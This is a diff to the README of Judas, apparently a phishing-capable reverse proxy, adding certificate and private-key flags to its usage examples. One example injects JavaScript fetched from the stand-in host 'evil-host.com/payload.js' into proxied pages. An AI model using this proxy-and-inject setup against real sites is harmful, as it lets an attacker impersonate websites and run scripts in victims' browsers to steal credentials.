@@ -26,7 +26,7 @@ It can optionally use an upstream proxy with the ```--proxy``` argument to proxy
 
 Example:
 ```
-./judas --target https://torwebsite.onion --proxy localhost:9150
+./judas --target https://torwebsite.onion --cert server.crt --private-key server.key --proxy localhost:9150
 ```
 
 By default, Judas listens on localhost:8080.
@@ -34,12 +34,12 @@ To change this, use the ```--address``` argument.
 
 Example:
 ```
-./judas --target https://target-url.com --address=0.0.0.0:8080
+./judas --target https://target-url.com --cert server.crt --private-key server.key --address=0.0.0.0:8080
 ```
 
 Judas can also inject custom JavaScript into requests by passing a URL to a JS file with the ```--inject-js``` argument.
 
 Example:
 ```
-./judas --target https://target-url.com --inject-js https://evil-host.com/payload.js
+./judas --target https://target-url.com --cert server.crt --private-key server.key --inject-js https://evil-host.com/payload.js
 ```
